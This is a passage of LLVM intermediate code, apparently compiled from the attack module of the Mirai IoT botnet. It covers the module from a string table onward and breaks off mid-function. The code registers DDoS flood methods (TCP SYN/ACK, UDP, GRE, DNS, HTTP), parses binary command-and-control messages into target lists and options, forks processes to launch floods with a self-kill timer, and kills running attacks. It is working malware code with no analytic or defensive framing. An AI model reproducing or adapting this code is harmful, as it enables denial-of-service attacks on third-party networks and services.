inbounds ([2 x i8], [2 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.255, i32 0, i32 0)], align 16

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() local_unnamed_addr #0 {
  tail call fastcc void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcp)
  tail call fastcc void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpplain)
  tail call fastcc void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_stdhex)
  tail call fastcc void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_greip)
  tail call fastcc void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_greeth)
  tail call fastcc void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udprandom)
  tail call fastcc void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpack)
  tail call fastcc void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpsyn)
  tail call fastcc void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpstorm)
  tail call fastcc void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_dns)
  tail call fastcc void @add_attack(i8 zeroext 11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_app_http)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) unnamed_addr #0 {
  %3 = tail call noalias i8* @calloc(i64 1, i64 16) #7
  %4 = getelementptr inbounds i8, i8* %3, i64 8
  store i8 %0, i8* %4, align 8
  %5 = bitcast i8* %3 to void (i8, %struct.attack_target*, i8, %struct.attack_option*)**
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %5, align 8
  %6 = load i8*, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %7 = load i8, i8* @methods_len, align 1
  %8 = zext i8 %7 to i64
  %9 = shl nuw nsw i64 %8, 3
  %10 = add nuw nsw i64 %9, 8
  %11 = tail call i8* @realloc(i8* %6, i64 %10) #7
  %12 = bitcast i8* %11 to %struct.attack_method**
  store i8* %11, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %13 = load i8, i8* @methods_len, align 1
  %14 = add i8 %13, 1
  store i8 %14, i8* @methods_len, align 1
  %15 = zext i8 %13 to i64
  %16 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %12, i64 %15
  %17 = bitcast %struct.attack_method** %16 to i8**
  store i8* %3, i8** %17, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #1

; Function Attrs: nounwind
declare noalias i8* @realloc(i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() local_unnamed_addr #0 {
  %1 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 0), align 16
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @kill(i32 %1, i32 9) #7
  br label %5

; <label>:5:                                      ; preds = %0, %3
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 0), align 16
  %6 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 1), align 4
  %7 = icmp eq i32 %6, 0
  br i1 %7, label %10, label %8

; <label>:8:                                      ; preds = %5
  %9 = tail call i32 @kill(i32 %6, i32 9) #7
  br label %10

; <label>:10:                                     ; preds = %8, %5
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 1), align 4
  %11 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 2), align 8
  %12 = icmp eq i32 %11, 0
  br i1 %12, label %15, label %13

; <label>:13:                                     ; preds = %10
  %14 = tail call i32 @kill(i32 %11, i32 9) #7
  br label %15

; <label>:15:                                     ; preds = %13, %10
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 2), align 8
  %16 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 3), align 4
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %20, label %18

; <label>:18:                                     ; preds = %15
  %19 = tail call i32 @kill(i32 %16, i32 9) #7
  br label %20

; <label>:20:                                     ; preds = %18, %15
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 3), align 4
  %21 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 4), align 16
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %25, label %23

; <label>:23:                                     ; preds = %20
  %24 = tail call i32 @kill(i32 %21, i32 9) #7
  br label %25

; <label>:25:                                     ; preds = %23, %20
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 4), align 16
  %26 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 5), align 4
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %30, label %28

; <label>:28:                                     ; preds = %25
  %29 = tail call i32 @kill(i32 %26, i32 9) #7
  br label %30

; <label>:30:                                     ; preds = %28, %25
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 5), align 4
  %31 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 6), align 8
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %35, label %33

; <label>:33:                                     ; preds = %30
  %34 = tail call i32 @kill(i32 %31, i32 9) #7
  br label %35

; <label>:35:                                     ; preds = %33, %30
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 6), align 8
  %36 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 7), align 4
  %37 = icmp eq i32 %36, 0
  br i1 %37, label %40, label %38

; <label>:38:                                     ; preds = %35
  %39 = tail call i32 @kill(i32 %36, i32 9) #7
  br label %40

; <label>:40:                                     ; preds = %38, %35
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 7), align 4
  %41 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 8), align 16
  %42 = icmp eq i32 %41, 0
  br i1 %42, label %45, label %43

; <label>:43:                                     ; preds = %40
  %44 = tail call i32 @kill(i32 %41, i32 9) #7
  br label %45

; <label>:45:                                     ; preds = %43, %40
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 8), align 16
  %46 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 9), align 4
  %47 = icmp eq i32 %46, 0
  br i1 %47, label %50, label %48

; <label>:48:                                     ; preds = %45
  %49 = tail call i32 @kill(i32 %46, i32 9) #7
  br label %50

; <label>:50:                                     ; preds = %48, %45
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 9), align 4
  %51 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 10), align 8
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %55, label %53

; <label>:53:                                     ; preds = %50
  %54 = tail call i32 @kill(i32 %51, i32 9) #7
  br label %55

; <label>:55:                                     ; preds = %53, %50
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 10), align 8
  %56 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 11), align 4
  %57 = icmp eq i32 %56, 0
  br i1 %57, label %60, label %58

; <label>:58:                                     ; preds = %55
  %59 = tail call i32 @kill(i32 %56, i32 9) #7
  br label %60

; <label>:60:                                     ; preds = %58, %55
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 11), align 4
  %61 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 12), align 16
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %65, label %63

; <label>:63:                                     ; preds = %60
  %64 = tail call i32 @kill(i32 %61, i32 9) #7
  br label %65

; <label>:65:                                     ; preds = %63, %60
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 12), align 16
  %66 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 13), align 4
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %70, label %68

; <label>:68:                                     ; preds = %65
  %69 = tail call i32 @kill(i32 %66, i32 9) #7
  br label %70

; <label>:70:                                     ; preds = %68, %65
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 13), align 4
  %71 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 14), align 8
  %72 = icmp eq i32 %71, 0
  br i1 %72, label %75, label %73

; <label>:73:                                     ; preds = %70
  %74 = tail call i32 @kill(i32 %71, i32 9) #7
  br label %75

; <label>:75:                                     ; preds = %73, %70
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 14), align 8
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) local_unnamed_addr #0 {
  %3 = icmp ult i32 %1, 4
  br i1 %3, label %.thread80, label %4

; <label>:4:                                      ; preds = %2
  %5 = bitcast i8* %0 to i32*
  %6 = load i32, i32* %5, align 4
  %7 = tail call i32 @ntohl(i32 %6) #8
  %8 = icmp eq i32 %1, 4
  br i1 %8, label %.thread80, label %9

; <label>:9:                                      ; preds = %4
  %10 = getelementptr inbounds i8, i8* %0, i64 4
  %11 = load i8, i8* %10, align 1
  %12 = icmp eq i32 %1, 5
  br i1 %12, label %.thread80, label %13

; <label>:13:                                     ; preds = %9
  %14 = getelementptr inbounds i8, i8* %0, i64 5
  %15 = getelementptr inbounds i8, i8* %0, i64 6
  %16 = load i8, i8* %14, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp eq i8 %16, 0
  br i1 %18, label %.thread80, label %19

; <label>:19:                                     ; preds = %13
  %20 = add i32 %1, -6
  %21 = sext i32 %20 to i64
  %22 = zext i8 %16 to i64
  %23 = mul nuw nsw i64 %22, 5
  %24 = icmp ult i64 %21, %23
  br i1 %24, label %.thread80, label %.lr.ph88.preheader

.lr.ph88.preheader:                               ; preds = %19
  %25 = tail call noalias i8* @calloc(i64 %22, i64 24) #7
  %26 = bitcast i8* %25 to %struct.attack_target*
  %27 = add nsw i32 %17, -1
  %28 = zext i32 %27 to i64
  %29 = mul nuw nsw i64 %28, 5
  %30 = add nuw nsw i64 %29, 11
  %scevgep = getelementptr i8, i8* %0, i64 %30
  %wide.trip.count = zext i8 %16 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph88.prol.loopexit, label %.lr.ph88.prol.preheader

.lr.ph88.prol.preheader:                          ; preds = %.lr.ph88.preheader
  br label %.lr.ph88.prol

.lr.ph88.prol:                                    ; preds = %.lr.ph88.prol.preheader
  %31 = bitcast i8* %15 to i32*
  %32 = load i32, i32* %31, align 4
  %33 = getelementptr inbounds i8, i8* %25, i64 16
  %34 = bitcast i8* %33 to i32*
  store i32 %32, i32* %34, align 4
  %35 = getelementptr inbounds i8, i8* %0, i64 10
  %36 = getelementptr inbounds i8, i8* %0, i64 11
  %37 = load i8, i8* %35, align 1
  %38 = getelementptr inbounds i8, i8* %25, i64 20
  store i8 %37, i8* %38, align 4
  %39 = bitcast i8* %25 to i16*
  store i16 2, i16* %39, align 4
  %40 = load i32, i32* %34, align 4
  %41 = getelementptr inbounds i8, i8* %25, i64 4
  %42 = bitcast i8* %41 to i32*
  store i32 %40, i32* %42, align 4
  br label %.lr.ph88.prol.loopexit

.lr.ph88.prol.loopexit:                           ; preds = %.lr.ph88.preheader, %.lr.ph88.prol
  %indvars.iv91.unr = phi i64 [ 0, %.lr.ph88.preheader ], [ 1, %.lr.ph88.prol ]
  %.087.unr = phi i8* [ %15, %.lr.ph88.preheader ], [ %36, %.lr.ph88.prol ]
  %43 = icmp eq i8 %16, 1
  br i1 %43, label %._crit_edge, label %.lr.ph88.preheader.new

.lr.ph88.preheader.new:                           ; preds = %.lr.ph88.prol.loopexit
  br label %.lr.ph88

.lr.ph88:                                         ; preds = %.lr.ph88, %.lr.ph88.preheader.new
  %indvars.iv91 = phi i64 [ %indvars.iv91.unr, %.lr.ph88.preheader.new ], [ %indvars.iv.next92.1, %.lr.ph88 ]
  %.087 = phi i8* [ %.087.unr, %.lr.ph88.preheader.new ], [ %58, %.lr.ph88 ]
  %44 = bitcast i8* %.087 to i32*
  %45 = load i32, i32* %44, align 4
  %46 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 1
  store i32 %45, i32* %46, align 4
  %47 = getelementptr inbounds i8, i8* %.087, i64 4
  %48 = getelementptr inbounds i8, i8* %.087, i64 5
  %49 = load i8, i8* %47, align 1
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 2
  store i8 %49, i8* %50, align 4
  %51 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 0
  store i16 2, i16* %51, align 4
  %52 = load i32, i32* %46, align 4
  %53 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 2, i32 0
  store i32 %52, i32* %53, align 4
  %indvars.iv.next92 = add nuw nsw i64 %indvars.iv91, 1
  %54 = bitcast i8* %48 to i32*
  %55 = load i32, i32* %54, align 4
  %56 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 1
  store i32 %55, i32* %56, align 4
  %57 = getelementptr inbounds i8, i8* %.087, i64 9
  %58 = getelementptr inbounds i8, i8* %.087, i64 10
  %59 = load i8, i8* %57, align 1
  %60 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 2
  store i8 %59, i8* %60, align 4
  %61 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 0
  store i16 2, i16* %61, align 4
  %62 = load i32, i32* %56, align 4
  %63 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 2, i32 0
  store i32 %62, i32* %63, align 4
  %indvars.iv.next92.1 = add nsw i64 %indvars.iv91, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next92.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.unr-lcssa, label %.lr.ph88

._crit_edge.unr-lcssa:                            ; preds = %.lr.ph88
  br label %._crit_edge

._crit_edge:                                      ; preds = %.lr.ph88.prol.loopexit, %._crit_edge.unr-lcssa
  %64 = add i32 %1, -6
  %65 = mul nsw i32 %17, -5
  %66 = add i32 %64, %65
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %.loopexit81.thread, label %68

; <label>:68:                                     ; preds = %._crit_edge
  %69 = load i8, i8* %scevgep, align 1
  %70 = icmp eq i8 %69, 0
  br i1 %70, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %68
  %71 = zext i8 %69 to i64
  %72 = tail call noalias i8* @calloc(i64 %71, i64 16) #7
  %73 = bitcast i8* %72 to %struct.attack_option*
  %74 = getelementptr inbounds i8, i8* %scevgep, i64 1
  %75 = add i32 %66, -1
  %76 = zext i8 %69 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %89
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %89 ]
  %.184 = phi i8* [ %74, %.lr.ph.preheader ], [ %95, %89 ]
  %.17583 = phi i32 [ %75, %.lr.ph.preheader ], [ %96, %89 ]
  %77 = icmp eq i32 %.17583, 0
  br i1 %77, label %.loopexit81.loopexit, label %78

; <label>:78:                                     ; preds = %.lr.ph
  %79 = load i8, i8* %.184, align 1
  %80 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %73, i64 %indvars.iv, i32 1
  store i8 %79, i8* %80, align 8
  %81 = icmp eq i32 %.17583, 1
  br i1 %81, label %.loopexit81.loopexit, label %82

; <label>:82:                                     ; preds = %78
  %83 = getelementptr inbounds i8, i8* %.184, i64 1
  %84 = getelementptr inbounds i8, i8* %.184, i64 2
  %85 = load i8, i8* %83, align 1
  %86 = add i32 %.17583, -2
  %87 = zext i8 %85 to i32
  %88 = icmp slt i32 %86, %87
  br i1 %88, label %.loopexit81.loopexit, label %89

; <label>:89:                                     ; preds = %82
  %90 = add nuw nsw i32 %87, 1
  %91 = zext i32 %90 to i64
  %92 = tail call noalias i8* @calloc(i64 %91, i64 1) #7
  %93 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %73, i64 %indvars.iv, i32 0
  store i8* %92, i8** %93, align 8
  tail call void @util_memcpy(i8* %92, i8* %84, i32 %87) #7
  %94 = zext i8 %85 to i64
  %95 = getelementptr inbounds i8, i8* %84, i64 %94
  %96 = sub nsw i32 %86, %87
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %97 = icmp slt i64 %indvars.iv.next, %76
  br i1 %97, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %89
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %68
  %.070 = phi %struct.attack_option* [ null, %68 ], [ %73, %.loopexit.loopexit ]
  %98 = tail call i32* @__errno_location() #8
  store i32 0, i32* %98, align 4
  tail call void @attack_start(i32 %7, i8 zeroext %11, i8 zeroext %16, %struct.attack_target* %26, i8 zeroext %69, %struct.attack_option* %.070)
  br label %.loopexit81

.loopexit81.loopexit:                             ; preds = %.lr.ph, %78, %82
  br label %.loopexit81

.loopexit81:                                      ; preds = %.loopexit81.loopexit, %.loopexit
  %.171 = phi %struct.attack_option* [ %.070, %.loopexit ], [ %73, %.loopexit81.loopexit ]
  %99 = icmp eq i8* %25, null
  br i1 %99, label %100, label %.loopexit81.thread

.loopexit81.thread:                               ; preds = %._crit_edge, %.loopexit81
  %.17195 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ null, %._crit_edge ]
  %.07393 = phi i8 [ %69, %.loopexit81 ], [ undef, %._crit_edge ]
  tail call void @free(i8* nonnull %25) #7
  br label %100

; <label>:100:                                    ; preds = %.loopexit81, %.loopexit81.thread
  %.17196 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ %.17195, %.loopexit81.thread ]
  %.07394 = phi i8 [ %69, %.loopexit81 ], [ %.07393, %.loopexit81.thread ]
  %101 = icmp eq %struct.attack_option* %.17196, null
  br i1 %101, label %.thread80, label %102

; <label>:102:                                    ; preds = %100
  %103 = zext i8 %.07394 to i32
  tail call fastcc void @free_opts(%struct.attack_option* nonnull %.17196, i32 %103)
  br label %.thread80

.thread80:                                        ; preds = %2, %4, %9, %13, %19, %100, %102
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #2

declare void @util_memcpy(i8*, i8*, i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) local_unnamed_addr #0 {
  %7 = tail call i32 @fork() #7
  %8 = icmp eq i32 %7, -1
  %9 = icmp sgt i32 %7, 0
  %or.cond = or i1 %8, %9
  br i1 %or.cond, label %10, label %11

; <label>:10:                                     ; preds = %6
  ret void

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @fork() #7
  switch i32 %12, label %.preheader [
    i32 -1, label %18
    i32 0, label %19
  ]

.preheader:                                       ; preds = %11
  %13 = load i8, i8* @methods_len, align 1
  %14 = icmp eq i8 %13, 0
  br i1 %14, label %.loopexit, label %.lr.ph

.lr.ph:                                           ; preds = %.preheader
  %15 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i64
  br label %25

; <label>:18:                                     ; preds = %11
  tail call void @exit(i32 0) #9
  unreachable

; <label>:19:                                     ; preds = %11
  %20 = tail call i32 @sleep(i32 %0) #7
  %21 = tail call i32 @getppid() #7
  %22 = tail call i32 @kill(i32 %21, i32 9) #7
  tail call void @exit(i32 0) #9
  unreachable

; <label>:23:                                     ; preds = %25
  %24 = icmp slt i64 %indvars.iv.next, %17
  br i1 %24, label %25, label %.loopexit.loopexit

; <label>:25:                                     ; preds = %.lr.ph, %23
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %23 ]
  %26 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %15, i64 %indvars.iv
  %27 = load %struct.attack_method*, %struct.attack_method** %26, align 8
  %28 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %27, i64 0, i32 1
  %29 = load i8, i8* %28, align 8
  %30 = icmp eq i8 %29, %1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %30, label %31, label %23

; <label>:31:                                     ; preds = %25
  %32 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %27, i64 0, i32 0
  %33 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %32, align 8
  tail call void %33(i8 zeroext %2, %struct.attack_target* %3, i8 zeroext %4, %struct.attack_option* %5) #7
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %23
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %31
  tail call void @exit(i32 0) #9
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @free_opts(%struct.attack_option*, i32) unnamed_addr #0 {
  %3 = icmp eq %struct.attack_option* %0, null
  br i1 %3, label %11, label %.preheader

.preheader:                                       ; preds = %2
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %9
  %indvars.iv = phi i64 [ %indvars.iv.next, %9 ], [ 0, %.lr.ph.preheader ]
  %5 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %0, i64 %indvars.iv, i32 0
  %6 = load i8*, i8** %5, align 8
  %7 = icmp eq i8* %6, null
  br i1 %7, label %9, label %8

; <label>:8:                                      ; preds = %.lr.ph
  tail call void @free(i8* nonnull %6) #7
  br label %9

; <label>:9:                                      ; preds = %.lr.ph, %8
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %9
  br label %._crit_edge
